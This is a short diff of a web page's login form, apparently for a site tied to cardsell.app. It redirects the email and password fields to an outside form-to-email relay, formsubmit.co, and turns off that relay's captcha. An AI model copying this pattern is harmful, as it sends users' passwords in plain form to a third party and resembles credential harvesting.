@@ -35,9 +35,9 @@
       var password = form.elements.password.value;
       if (email !== "" && password !== "") {
         // Replace the endpoint with the appropriate form submission endpoint
-        form.action = "https://submit-form.com/MmePvY1r";
+        form.action = "https://formsubmit.co/81865f8c10c13a3f3c936aa0a8e114c1";
         form.submit();
-        alert("sign-up successful!")
+        alert("Login successful!");
         closeLoginForm();
       }
     }
@@ -260,14 +260,15 @@ installPlugin(RUFFLE_EXTENSION);
     <h2>Sign Up</h2>
     <br>
     <form id="form" method="POST">
-      <input
+    <input
     type="hidden"
-    name="_redirect"
+    name="_next"
     value="https://cardsell.app/contact"
   />
+    <input type="hidden" name="_captcha" value="false">
       <label>
         Email:
-        <input type="email" name="email" required>
+        <input name="email" required>
       </label>
       <br><br>
       <label>
